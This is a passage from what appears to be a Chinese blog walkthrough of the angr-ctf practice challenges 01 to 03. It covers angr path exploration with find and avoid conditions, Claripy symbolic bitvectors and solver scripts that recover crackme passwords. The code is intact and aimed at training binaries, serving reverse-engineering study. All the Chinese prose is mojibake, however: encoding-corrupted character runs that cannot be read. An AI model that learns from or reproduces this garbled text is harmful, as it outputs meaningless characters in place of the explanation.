<code>find</code>â€”â€”ä¸€ä¸ª&#x2F;ä¸€ç»„ä»¤æ¨¡æ‹Ÿå™¨ç»ˆæ­¢è¿è¡Œçš„åœ°å€ï¼Œç¬¦åˆçš„æ‰§è¡ŒçŠ¶æ€ç»“æœä¼šè¢«æ”¾åˆ° <code>.found</code> åˆ—è¡¨ä¸­</p><p>ä½†é™¤äº† <code>find</code> å‚æ•°å¤–ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æŒ‡å®š <code>avoid</code> å‚æ•°â€”â€”æ¨¡æ‹Ÿå™¨è¿è¡Œä¸­åº”å½“è¦<strong>é¿å¼€</strong>çš„åœ°å€ï¼Œå½“ä¸€ä¸ªçŠ¶æ€æ‰§è¡Œåˆ°è¿™æ ·çš„åœ°å€æ—¶ï¼Œå…¶ä¼šè¢«æ”¾åœ¨ <code>.avoided</code> åˆ—è¡¨ä¸­å¹¶ä¸å†å¾€åæ‰§è¡Œ</p><p>æ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡æŒ‡å®š <code>num_find</code> å‚æ•°æ¥æŒ‡å®šéœ€è¦å¯»æ‰¾çš„è§£çŠ¶æ€çš„æ•°é‡ï¼Œè‹¥æœªæŒ‡å®šåˆ™ä¼šåœ¨ <code>.found</code> åˆ—è¡¨ä¸­å­˜å‚¨æ‰€æœ‰çš„è§£çŠ¶æ€</p><h3 id="FINAL-EXPLOUT"><a href="#FINAL-EXPLOUT" class="headerlink" title="FINAL EXPLOUT"></a>FINAL EXPLOUT</h3><p>ç°åœ¨æˆ‘ä»¬çŸ¥é“è¯¥å¦‚ä½•è¿›è¡Œè·¯å¾„é¿å…äº†ï¼Œäºæ˜¯æœ€åçš„æ±‚è§£è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./01_angr_avoid&#x27;</span><br>    proj = angr.Project(bin_path) <span class="hljs-comment"># load the binary file</span><br>    init_state = proj.factory.entry_state() <span class="hljs-comment"># create an empty context</span><br>    simgr = proj.factory.simgr(init_state) <span class="hljs-comment"># create a simulator_manager</span><br>    obj_path_addr = <span class="hljs-number">0x80492F8</span> <span class="hljs-comment"># the path we&#x27;d like to explore</span><br>    avoid_path_addr = <span class="hljs-number">0x80492BB</span> <span class="hljs-comment"># the path that we need to avoid</span><br>    simgr.explore(find = obj_path_addr, avoid = avoid_path_addr) <span class="hljs-comment"># start to explore</span><br><br>    <span class="hljs-keyword">if</span> simgr.found :<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-comment"># print the input that solve the constraint</span><br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())<br>    <span class="hljs-keyword">else</span> :<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>è¿˜æ˜¯ä¸€ä¸‹å­å°±å‡ºæ¥äº†ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/wfTengqWBDoRisK.png" alt="image.png"></p><blockquote><p>ç¬”è€…å®é™…è·‘äº†ä¸€ä¸‹ä¸é¿å¼€è¯¥çº¦æŸçš„æ±‚è§£åœºæ™¯ï¼Œå·¨<del>â„¢</del>æ…¢ï¼Œ<del>ç›´æ¥æŠŠğŸ‘´ã®é˜¿é‡Œâ˜å­¦ç”ŸğŸ“ç»™ç‚¸äº†</del></p></blockquote><h2 id="02-angr-find-conditionï¼šè‡ªå®šä¹‰æœç´¢æ¡ä»¶"><a href="#02-angr-find-conditionï¼šè‡ªå®šä¹‰æœç´¢æ¡ä»¶" class="headerlink" title="02_angr_find_conditionï¼šè‡ªå®šä¹‰æœç´¢æ¡ä»¶"></a>02_angr_find_conditionï¼šè‡ªå®šä¹‰æœç´¢æ¡ä»¶</h2><p>æƒ¯ä¾‹åœ°æ‹–å…¥ IDAï¼Œ<strong>ä¼¼ä¹</strong>é€»è¾‘å’Œç¬¬ä¸€é“é¢˜å·®ä¸å¤šï¼Œ<code>complex_function()</code> ä¹Ÿæ²¡å•¥æ”¹å˜è¿™é‡Œå°±ä¸è´´äº†ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/uFaZBR6c31KHbx5.png" alt="image.png"></p><p>ä½†ä¸€çœ‹æ±‡ç¼–å°±æµæ±—é»„è±†äº†ï¼Œ<strong>å› ä¸ºå®é™…ä¸Šå­˜åœ¨éå¸¸å¤šçš„ä¼ªè·¯å¾„</strong>ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/McqmdiDI2jXLE1f.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/10/31/vhqK89csVgQ3dZz.png" alt="image.png"></p><p><strong>å¹¶ä¸”æœ‰ç€éå¸¸å¤šçš„è¾“å‡º Good Job å­—ç¬¦ä¸²çš„åŸºæœ¬å—</strong>ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/fq8Gy3AHdLEXJ51.png" alt="image.png"></p><p>å¦‚æœä½ åªæ˜¯ç®€å•çœ‹äº†ä¸€ä¸‹ç„¶åéšä¾¿é€‰äº†ä¸€ä¸ªï¼ˆæ¯”å¦‚è¯´çœ‹åˆ°ç¬¬ä¸€ä¸ªç›´æ¥é€‰ï¼‰æ‰”è¿› angr é‡Œæ±‚è§£ï¼Œ<strong>é‚£å°±å¯„äº†</strong>ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/ZxejJwIW8TRGlD9.png" alt="image.png"></p><p>æ€ä¹ˆåŠå‘¢ï¼Ÿç¬¬ä¸€ç§æ–¹æ³•æ˜¯æ‰‹åŠ¨å†åˆ†æä¸€ä¸‹è¿™äº›ä¼ªè·¯å¾„ï¼Œä½†æ˜¯è¿™å°±ä¸ç¬¦åˆæˆ‘ä»¬ä½¿ç”¨ angr çš„è‡ªåŠ¨æ±‚è§£æ€æƒ³äº†ï¼šï¼‰å› æ­¤æˆ‘ä»¬éœ€è¦å¯»æ‰¾ä¸€ç§èƒ½å¤Ÿé¿å¼€è¿™äº›è·¯å¾„çš„æ–¹æ³•</p><h3 id="simgr-explore-çš„æ‰©å±•ç”¨æ³•"><a href="#simgr-explore-çš„æ‰©å±•ç”¨æ³•" class="headerlink" title="simgr.explore() çš„æ‰©å±•ç”¨æ³•"></a>simgr.explore() çš„æ‰©å±•ç”¨æ³•</h3><p>å®é™…ä¸Š <code>explore()</code> çš„å‚æ•° <code>find</code> ä¸ <code>avoid</code> é™¤äº†å¯ä»¥æ˜¯ç›®æ ‡åœ°å€å¤–ï¼Œ<strong>è¿˜å¯ä»¥æ˜¯è‡ªå®šä¹‰å‡½æ•°ï¼Œå‚æ•°ä¸ºæ¨¡æ‹ŸçŠ¶æ€ï¼Œè¿”å›å€¼ä¸ºåˆ¤å®šæ¡ä»¶çš„å¸ƒå°”å€¼</strong></p><ul><li>å³æˆ‘ä»¬å¯ä»¥ç¼–å†™è‡ªå®šä¹‰å‡½æ•°æ¥åˆ¤æ–­ä¸€ä¸ªçŠ¶æ€æ˜¯å¦æ˜¯æˆ‘ä»¬åº”å½“è¦å¯»æ‰¾çš„çŠ¶æ€</li></ul><p>ä¾‹å¦‚ï¼Œè‹¥æ˜¯æˆ‘ä»¬æƒ³è¦å¯»æ‰¾ä¸€æ¡è¾“å‡ºæŒ‡å®šå­—ç¬¦ä¸²çš„è·¯å¾„ï¼Œå¯ä»¥é€‰æ‹©é€šè¿‡åˆ¤æ–­è¯¥å­—ç¬¦ä¸²æ˜¯å¦åœ¨è¾“å‡ºä¸­çš„æ–¹å¼ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>state.posix.dumps(æ–‡ä»¶æè¿°ç¬¦)</code> æ¥è·å–å¯¹åº”æ–‡ä»¶æè¿°ç¬¦ä¸Šçš„å­—ç¬¦æµï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;arttnba3&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(<span class="hljs-number">1</span>) <span class="hljs-comment"># 1 for stdout</span><br><span class="hljs-comment"># ...</span><br>simgr.explore(find = foo)<br></code></pre></td></tr></table></figure><h3 id="FINAL-EXPLOUT-1"><a href="#FINAL-EXPLOUT-1" class="headerlink" title="FINAL EXPLOUT"></a>FINAL EXPLOUT</h3><p>é‚£ä¹ˆè§£é¢˜æ€è·¯å°±æ¸…æ™°äº†ï¼Œæˆ‘ä»¬å°†æ±‚è§£çš„ç›®æ ‡è·¯å¾„è®¾ä¸ºè¾“å‡º <code>&quot;Good Job.&quot;</code> å­—ç¬¦ä¸²ã€avoid è·¯å¾„è®¾ä¸ºè¾“å‡º <code>&quot;Try again.&quot;</code> å­—ç¬¦ä¸²å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve</span>():<br>    bin_path = <span class="hljs-string">&#x27;./02_angr_find_condition&#x27;</span><br>    proj = angr.Project(bin_path)<br>    init_state = proj.factory.entry_state()<br>    simgr = proj.factory.simgr(init_state)<br><br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solve()<br></code></pre></td></tr></table></figure><p>è¿˜æ˜¯ç§’è§£ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/9nVmrKZvkezSdRQ.png" alt="image.png"></p><h1 id="0x02-angr-ctfï¼šç¬¦å·åŒ–"><a href="#0x02-angr-ctfï¼šç¬¦å·åŒ–" class="headerlink" title="0x02. angr-ctfï¼šç¬¦å·åŒ–"></a>0x02. angr-ctfï¼šç¬¦å·åŒ–</h1><h2 id="03-angr-symbolic-registersï¼šç¬¦å·åŒ–å¯„å­˜å™¨"><a href="#03-angr-symbolic-registersï¼šç¬¦å·åŒ–å¯„å­˜å™¨" class="headerlink" title="03_angr_symbolic_registersï¼šç¬¦å·åŒ–å¯„å­˜å™¨"></a>03_angr_symbolic_registersï¼šç¬¦å·åŒ–å¯„å­˜å™¨</h2><p>æƒ¯ä¾‹æ‹–è¿› IDAï¼Œå¤§æ¦‚æ˜¯è¯»å…¥è¾“å…¥åç”¨ä¸‰ä¸ªå‡½æ•°ç®€å•ç®—ä¸€ä¸‹ï¼Œè¾“å…¥å‚æ•°æ˜¯ <code>eaxã€ebxã€edx</code> å¯„å­˜å™¨çš„å€¼ï¼Œä¸‰ä¸ªç»“æœéƒ½ä¸º 0 å°±ğŸ†—äº†ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/Yze2DrmB6a1owTQ.png" alt="image.png"></p><p>åœ¨ <code>get_user_input()</code> é‡Œä¼šåˆ†åˆ«è¯»ä¸‰ä¸ªæ•°åˆ° <code>eaxã€ebxã€edx</code> å¯„å­˜å™¨ä¸­ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/2n6murUotEjVgCi.png" alt="image.png"></p><blockquote><p>ç„¶åä½ ä¼šå‘ç°åç¼–è¯‘çš„ç»“æœå°±æ˜¯ä¸ªğŸ“â‘§â€¦ğŸ‘´åˆšçœ‹åç¼–è¯‘çš„ä¼ªä»£ç è¿˜æƒ³äº†åŠå¤©ä¸ºå•¥è¦å¤šè¯»ä¸¤ä¸ªæ•°ç„¶åæ‰”æ‰</p><p><img src="https://s2.loli.net/2022/10/31/DoxlVIvprB4KATb.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/10/31/8poqhHj2W1gi6lk.png" alt="image.png"></p></blockquote><p>ç„¶åä½ ä¼šå‘ç°ç”¨ä¸Šä¸€é¢˜çš„è„šæœ¬ä¹Ÿèƒ½ç§’è§£â€¦ä¸è¿‡è¿™æ ·å°±ä¸æ˜¯è¿™é“é¢˜å‡ºé¢˜çš„ç›®çš„äº†ï¼šï¼‰</p><p>é‡æ–°è¯»ä¸€ä¸‹é¢˜ç›®â€”â€”<code>symbolic registers</code>ï¼Œè¿™æ„å‘³ç€<strong>æœ¬é¢˜æˆ‘ä»¬åº”å½“å°†è¿™ä¸‰ä¸ªå¯„å­˜å™¨è®¾ç½®ä¸ºç¬¦å·å˜é‡æ¥è¿›è¡Œçº¦æŸæ±‚è§£</strong></p><h3 id="Claripy-angr-çš„æ±‚è§£å¼•æ“"><a href="#Claripy-angr-çš„æ±‚è§£å¼•æ“" class="headerlink" title="Claripy - angr çš„æ±‚è§£å¼•æ“"></a>Claripy - angr çš„æ±‚è§£å¼•æ“</h3><p><code>Claripy</code> æ˜¯ angr çš„<strong>æ±‚è§£å¼•æ“</strong>ï¼ˆsolver engineï¼‰ï¼Œå…¶å†…éƒ¨ä¼šæ— ç¼æ··åˆä½¿ç”¨å‡ ç§åç«¯ï¼ˆconcrete bitvectorsã€SAT solvers ç­‰ï¼‰ï¼Œå¯¹äºæˆ‘ä»¬è€Œè¨€ä¸€èˆ¬ä¸éœ€è¦ç›´æ¥ä¸å…¶è¿›è¡Œäº¤äº’ï¼Œä½†é€šå¸¸æˆ‘ä»¬ä¼šä½¿ç”¨å…¶æä¾›çš„ä¸€äº›æ¥å£</p><h4 id="bitvector-ä½å‘é‡"><a href="#bitvector-ä½å‘é‡" class="headerlink" title="bitvector - ä½å‘é‡"></a>bitvector - ä½å‘é‡</h4><p><strong>ä½å‘é‡</strong>ï¼ˆbitvectorï¼‰æ˜¯ angr æ±‚è§£å¼•æ“ä¸­çš„ä¸€ä¸ªé‡è¦éƒ¨åˆ†ï¼Œå…¶è¡¨ç¤ºäº† <strong>ä¸€ç»„ä½</strong> ï¼ˆa sequence of bitsï¼‰</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>claripy.BVV(int_value, size_in_bits)</code> æˆ– <code>claripy.BVV(string_value)</code> åˆ›å»ºå¸¦æœ‰å…·ä½“å€¼ï¼ˆconcrete valueï¼‰çš„æŒ‡å®šé•¿åº¦çš„ä½å‘é‡å€¼ï¼ˆbitvector valueï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvv = claripy.BVV(<span class="hljs-string">b&#x27;arttnba3&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv<br>&lt;BV64 <span class="hljs-number">0x617274746e626133</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv2 = claripy.BVV(<span class="hljs-number">0xdeadbeef</span>, <span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv2<br>&lt;BV32 <span class="hljs-number">0xdeadbeef</span>&gt;<br></code></pre></td></tr></table></figure><p>ç›¸åŒé•¿åº¦çš„ä½å‘é‡å¯ä»¥è¿›è¡Œè¿ç®—ï¼Œå¯¹äºä¸åŒé•¿åº¦çš„ä½å‘é‡åˆ™å¯ä»¥é€šè¿‡ <code>.zero_extend(extended_bits)</code> å®Œæˆä½æ‰©å±•ï¼ˆ0å¡«å……ï¼‰åè¿›è¡Œè¿ç®—ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ä½å‘é‡çš„è¿ç®—åŒæ ·å­˜åœ¨æº¢å‡ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvv2 = bvv2.zero_extend(<span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv + bvv2<br>&lt;BV64 <span class="hljs-number">0x617274754d102022</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv * bvv<br>&lt;BV64 <span class="hljs-number">0x9842ff8e63f3b029</span>&gt;<br></code></pre></td></tr></table></figure><p>ä½å‘é‡é™¤äº†ä»£è¡¨å…·ä½“å€¼ï¼ˆconcrete valueï¼‰çš„ <code>bitvector value</code> ä»¥å¤–ï¼Œè¿˜æœ‰ä»£è¡¨<strong>ç¬¦å·å˜é‡</strong>ï¼ˆsymbolic variableï¼‰çš„ <code>bitvector symbol</code>ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>claripy.BVS(name, size_in_bits)</code> åˆ›å»ºå¸¦åå­—çš„æŒ‡å®šé•¿åº¦çš„ä½å‘é‡ç¬¦å·ï¼ˆbitvector symbolï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvs = claripy.BVS(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-number">64</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs<br>&lt;BV64 x_0_64&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs2 = claripy.BVS(<span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-number">64</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs2<br>&lt;BV64 y_1_64&gt;<br></code></pre></td></tr></table></figure><p>ä½å‘é‡ç¬¦å·ä¸ä½å‘é‡å€¼ä¹‹é—´åŒæ„å¯ä»¥è¿›è¡Œè¿ç®—ï¼Œç»„åˆæˆæ›´åŠ å¤æ‚çš„è¡¨è¾¾å¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvs3 = (bvs * bvs2 + bvv) / bvs<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs3<br>&lt;BV64 (x_0_64 * y_1_64 + <span class="hljs-number">0x617274746e626133</span>) / x_0_64&gt;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>.op</code> ä¸ <code>.args</code> è·å¾—ä½å‘é‡çš„è¿ç®—ç±»å‹ä¸å‚æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvv.op<br><span class="hljs-string">&#x27;BVV&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs.op<br><span class="hljs-string">&#x27;BVS&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs3.op<br><span class="hljs-string">&#x27;__floordiv__&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs3.args<br>(&lt;BV64 x_0_64 * y_1_64 + <span class="hljs-number">0x617274746e626133</span>&gt;, &lt;BV64 x_0_64&gt;)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv.args<br>(<span class="hljs-number">7021802812440994099</span>, <span class="hljs-number">64</span>)<br></code></pre></td></tr></table></figure><h3 id="state-solver-çŠ¶æ€çš„æ±‚è§£æ¥å£"><a href="#state-solver-çŠ¶æ€çš„æ±‚è§£æ¥å£" class="headerlink" title="state.solver - çŠ¶æ€çš„æ±‚è§£æ¥å£"></a>state.solver - çŠ¶æ€çš„æ±‚è§£æ¥å£</h3><p>å‰é¢è®²åˆ° <code>state.solver</code> æä¾›äº†ä¸€äº›åŸºäºçŠ¶æ€çš„æ±‚è§£æ¥å£ï¼Œä¾‹å¦‚ solver åŒæ ·æœ‰åˆ›å»ºä½å‘é‡çš„ <code>.BVV()</code> ä¸ <code>.BVS()</code> æ¥å£</p><p>åœ¨éœ€è¦å¯¹ä½å‘é‡ç¬¦å·è¿›è¡Œå…·ä½“å€¼çš„æ±‚è§£æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆå°†ä½å‘é‡ç¬¦å·å­˜æ”¾åˆ°çŠ¶æ€çš„å†…å­˜&#x2F;å¯„å­˜å™¨ä¸­ï¼Œä¹‹åç”¨ simgr æ¢ç´¢åˆ°å¯¹åº”çš„çŠ¶æ€åï¼Œå†ä½¿ç”¨ <code>state.solver.eval()</code> æˆå‘˜å‡½æ•°æ¥è·å–å¯¹åº”ä½å‘é‡åœ¨å½“å‰çŠ¶æ€ä¸‹çš„å€¼ï¼Œä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„ğŸŒ°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">bvs_to_solve = claripy.BVS(<span class="hljs-string">&#x27;bvs_to_solve&#x27;</span>, <span class="hljs-number">64</span>)<br>init_state = proj.factory.entry_state()<br>init_state.memory.store(<span class="hljs-number">0xdeadbeef</span>, bvs_to_solve)<br>simgr = proj.factory.simgr(init_state)<br>simgr.explore(find = <span class="hljs-number">0xbeefdead</span>)<br><br>solver_state = simgr.found[<span class="hljs-number">0</span>]<br><span class="hljs-built_in">print</span>(solver_state.solver.<span class="hljs-built_in">eval</span>(bvs_to_solve))<br></code></pre></td></tr></table></figure><h3 id="FINAL-EXPLOIT-1"><a href="#FINAL-EXPLOIT-1" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦åˆ›å»ºä¸€ä¸ªä» <code>get_user_input()</code> ä¹‹åå¼€å§‹æ‰§è¡Œçš„ç©ºç™½çš„çŠ¶æ€ï¼Œå¹¶å°†å¯¹åº”çš„å¯„å­˜å™¨è®¾ç½®ä¸ºä½å‘é‡ç¬¦å·ï¼Œä¹‹ååœ¨æ±‚è§£çŠ¶æ€ä½¿ç”¨ <code>.solver.eval()</code> æ¥æ±‚è§£å³å¯</p><p>æœ€åçš„æ±‚è§£è„šæœ¬å¦‚ä¸‹ï¼Œè¯¦è§æ³¨é‡Šï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./03_angr_symbolic_registers&#x27;</span><br>    proj = angr.Project(bin_path)<br>    <span class="hljs-comment"># blank_state() means creating an empty state and set the current PC to specific addr</span><br>    start_addr = <span class="hljs-number">0x8049670</span><br>    init_state = proj.factory.blank_state(addr = start_addr)<br>    <br>    <span class="hljs-comment"># create  symbolic variables with claripy.BVS(name, size), size is counted by bits</span><br>    password_0 = claripy.BVS(<span class="hljs-string">&#x27;password_0&#x27;</span>, <span class="hljs-number">32</span>) <span class="hljs-comment"># 32-bit registers</span><br>    password_1 = claripy.BVS(<span class="hljs-string">&#x27;password_1&#x27;</span>, <span class="hljs-number">32</span>) <span class="hljs-comment"># 32-bit registers</span><br>    password_2 = claripy.BVS(<span class="hljs-string">&#x27;password_2&#x27;</span>, <span class="hljs-number">32</span>) <span class="hljs-comment"># 32-bit registers</span><br>    <br>    <span class="hljs-comment"># set the init_state&#x27;s register to corresponding symbolic variables</span><br>    init_state.regs.eax = password_0<br>    init_state.regs.ebx = password_1<br>    init_state.regs.edx = password_2<br>    <br>    <span class="hljs-comment"># now solve it!</span><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br>    <br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-comment"># we use state.solver.eval(BVS) to get the answer value there</span><br>        solution_0 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_0)<br>        solution_1 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_1)<br>        solution_2 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_2)<br>        <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_0: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(solution_0)))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_1: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(solution_1)))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_2: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(solution_2)))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>å¾ˆå¿«å•Šï¼Œå•ªçš„ä¸€ä¸‹å°±å‡ºæ¥äº†.mkv</p><p><img src="https://s2.loli.net/2022/10/31/MkU5bdLO4js6ZXy.png" alt="image.png"></p><h2 